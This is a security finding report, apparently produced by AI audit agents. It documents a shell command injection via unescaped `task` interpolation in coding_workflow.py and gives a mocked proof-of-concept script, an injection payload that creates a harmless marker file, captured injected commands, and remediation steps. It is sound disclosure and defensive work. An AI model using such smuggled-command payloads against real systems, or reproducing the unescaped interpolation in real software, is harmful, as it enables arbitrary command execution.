title: Shell command injection via unescaped `task` interpolation in coding_workflow.py
description: The `task` parameter of `coding_workflow()` is interpolated unescaped into four `/bin/bash -c "..."` command strings (branch name, `git checkout -b`, `git commit -m`, `git push`). A task string containing a double quote breaks out of the quoted command, allowing arbitrary shell command execution on the AgentCore runtime with the session's privileges. In the repository as committed, `task` comes only from the operator's `sys.argv[1]`; the vulnerability is realized when `task` is supplied by an untrusted source (ticket title, webhook payload, LLM-derived task string), which the function's design (a JIRA-style ticket identifier) makes the plausible integration.
impact: Arbitrary command execution on the AgentCore runtime container (full read/write/execute within that session's privileges, including the `/workspace` checkout it operates on and any credentials available to the runtime session) whenever a task string under attacker influence reaches the workflow. Demonstrated harmlessly with a file-creation marker; no AWS APIs or deployed targets were contacted.
technical_analysis: `coding_workflow()` builds shell commands by f-string interpolation of `task` and its derived `branch` name into `/bin/bash -c "..."` strings with no escaping, quoting, or validation. Four sites: the branch-name construction, `git checkout -b`, `git commit -m 'Fix {task}'` (single-quoted context inside the double-quoted `bash -c` string — a double quote in `task` still terminates the outer quoting when the outer level is re-parsed), and `git push origin {branch}`. The commands are handed to `AgentCoreShell.run()`, which forwards them verbatim as the `command` body of `invoke_agent_runtime_command`. Because the runtime executes the string through `/bin/bash -c`, any double quote in `task` closes the quoted segment and the remainder is parsed as fresh shell syntax by the outer shell. A single-quote in `task` additionally escapes the `git commit -m '...'` argument. Line 34 also interpolates `task` into the reasoning prompt sent to `invoke_agent`, which is a prompt-injection surface if ticket content is ever passed through, though it does not reach a shell.
poc_description:
1. Stub `boto3` so `AgentCoreShell` never contacts AWS: monkeypatch `shell_client.boto3.client` with a fake whose `invoke_agent_runtime_command` records `body["command"]` and executes it locally via `subprocess` in a temp directory with a fake `PATH` (stub `git`/`npm`/`npx` scripts that exit 0).
2. Call `coding_workflow(shell, 'JIRA-1234" ; : > /tmp/<sandbox>/pwned_marker #')`.
3. Observe that the three git-operation command strings break out of their double quotes and the marker file is created by the injected `: >` builtin.
4. Re-run with a benign task (`JIRA-1234`) as the negative control: no marker, well-formed commands.
poc_script_code:
import os, shutil, subprocess, sys, tempfile

sys.path.insert(0, "/workspace/AgentcoreShell")
SENT = []
SANDBOX = tempfile.mkdtemp(prefix="agentcore_poc_")
FAKEBIN = tempfile.mkdtemp(prefix="agentcore_fakebin_")

class FakeClient:
    def invoke_agent_runtime(self, **kw):
        return {"stream": []}
    def invoke_agent_runtime_command(self, **kw):
        SENT.append(kw["body"]["command"])
        proc = subprocess.run(["/bin/bash", "-c", kw["body"]["command"]],
                              cwd=SANDBOX, capture_output=True, text=True,
                              env={"PATH": FAKEBIN, "HOME": SANDBOX}, timeout=10)
        return {"stream": [{"chunk": {"contentStop":
                {"exitCode": proc.returncode, "status": "COMPLETED"}}}]}

import shell_client
shell_client.boto3 = type("m", (), {"client":
        staticmethod(lambda *a, **k: FakeClient())})

for tool in ("git", "npm", "npx"):
    p = os.path.join(FAKEBIN, tool)
    open(p, "w").write("#!/bin/sh\nexit 0\n")
    os.chmod(p, 0o755)

shell = shell_client.AgentCoreShell()
MARKER = os.path.join(SANDBOX, "pwned_marker")

# task as it would arrive from an untrusted upstream (ticket title / webhook)
UNTRUSTED_TASK = 'JIRA-1234" ; : > ' + MARKER + " #"

from coding_workflow import coding_workflow
coding_workflow(shell, UNTRUSTED_TASK)

print("marker created:", os.path.exists(MARKER))
for c in SENT:
    print("sent:", c)
injected = os.path.exists(MARKER)
shutil.rmtree(SANDBOX); shutil.rmtree(FAKEBIN)
assert injected, "marker not created - injection failed"
print("Shell command injection reproduced (harmless marker only).")
remediation_steps: Treat `task` as untrusted data at the point where it crosses into command construction. Preferred: stop building shell strings entirely — pass commands as argument lists (or have the runtime accept `argv`) so no shell metacharacter interpretation occurs, and derive the branch name and commit message from a validated identifier rather than the raw string. At minimum: validate `task` against a strict allowlist (for example `^[A-Z][A-Z0-9]*-[0-9]+$` for ticket-style identifiers) and reject anything else before it is interpolated; apply `shlex.quote()` to every interpolated value if free-form text must be supported. Both the allowlist and the quoting were verified in a mocked reproduction to block the payload while leaving benign task identifiers working. If ticket content is ever forwarded to `shell.invoke_agent` as well, sanitize or bound it there too to avoid pairing this with prompt injection.
evidence:
Captured command strings sent to the (mocked) runtime client for `task = 'JIRA-1234" ; : > /tmp/agentcore_poc_XXXX/pwned_marker #'`:

```text
/bin/bash -c "cd /workspace && git checkout -b fix/jira-1234" ; : > /tmp/agentcore_poc_XXXX/pwned_marker #"
/bin/bash -c "cd /workspace && git commit -m 'Fix JIRA-1234" ; : > /tmp/agentcore_poc_XXXX/pwned_marker #'"
/bin/bash -c "cd /workspace && git push origin fix/jira-1234" ; : > /tmp/agentcore_poc_XXXX/pwned_marker #"
```

The injected `; : > <marker>` runs as a top-level shell command and the marker file is created. Negative control with `task='JIRA-1234'`: all commands are well-formed, no marker created. Reproduced independently twice (root agent and a separate validation agent) with an identical payload class.
assumptions: Requires the `task` string passed to `coding_workflow()` to originate from (or be influenceable by) an untrusted party — e.g. an issue title, webhook payload, or LLM-derived task description. In the repository as shipped, the only caller is the operator's command line, so this is a latent injection that becomes exploitable the moment the workflow is wired to an untrusted task source.
counterevidence: Strongest case against: in the shipped code the only caller is `main()` reading `sys.argv[1]`, i.e. the operator's own CLI argument — per the engagement's rules, commands an authorized shell user intentionally supplies are not vulnerabilities, so there is no untrusted input path in this commit. Also, the `bash -c` execution itself is the feature's purpose, and no network listener or unauthenticated surface exists. These facts cap the severity: it is not unauthenticated RCE, and the finding is contingent on a future untrusted wiring of `task`. However, no validation, quoting, or allowlist exists anywhere on the `task` path (verified by reading all call sites), so the latent injection is real and the function signature actively invites external task identifiers.
severity_change_conditions: Confirmation that `task` is (or will be) wired to an untrusted source — e.g. a ticketing integration, webhook handler, or LLM output — would raise this to high; conversely, if the workflow is guaranteed to remain operator-CLI-only, it stays a hardening/defense-in-depth item.

update_history.reason: The previously filed PoC script asserted on the marker after the sandbox directories were already removed, which would always fail. Reordered so the check precedes cleanup.
